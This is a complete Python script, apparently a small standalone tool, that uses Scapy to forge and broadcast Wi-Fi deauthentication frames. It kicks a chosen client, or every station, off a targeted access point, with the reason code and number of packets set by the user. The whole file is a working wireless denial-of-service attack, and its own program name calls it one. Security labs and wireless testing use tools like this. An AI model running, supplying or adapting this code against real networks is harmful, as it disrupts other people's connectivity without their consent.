import argparse

from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Passing arguments
parser = argparse.ArgumentParser(prog="Scapy deauth attack",
                                 usage="python deauth-py -i wlan0mon -b EC:9B:F3:55:F3:AA -c AE:94:BA:16:F3:D9 -n 10 -r 1",
                                 description="Scapy based wifi Deauth")
parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=True, help="The BSSID of the Wireless Access Point you want to target")
parser.add_argument("-c", "--Client", required=True,
                    help="The MAC address of the Client you want to kick off the Access Point, use FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point")
parser.add_argument("-n", "--Number", required=True, help="The number of deauth packets you want to send")
parser.add_argument("-r", "--Reason", required=False,
                    help="The code that you want to send. Supported code are : 1, 4, 5 and 8")

args = parser.parse_args()
KO = True
stop = False
while KO:

    try:
        code = int(input("Entrer the reason code that you want to send. (1, 4, 5 or 8) (enter -1 to leave): "))
        if code == -1:
            stop = True
        KO = False
    except:
        print("Code need to be an Int")

if stop:
    exit()
addr1 = ''
addr2 = ''
addr3 = ''
addr4 = ''

if code == 1 or code == 4 or code == 5:
    addr1 = args.Client
    addr2 = args.BSSID
    addr3 = args.BSSID
elif code == 8:
    addr1 = args.BSSID
    addr2 = args.Client
    addr3 = args.BSSID
else:
    print("Unknown reason code. Need to be 1, 4, 5 or 8")
    exit(0)

packet = RadioTap() / Dot11(type=0, subtype=12, addr1=addr1, addr2=addr2, addr3=addr3, addr4=addr4) / Dot11Deauth(
    reason=code)

for n in range(int(args.Number)):
    sendp(packet, iface=args.Interface)
    print("#{}: Deauth sent via: {} ".format(n, args.Interface))
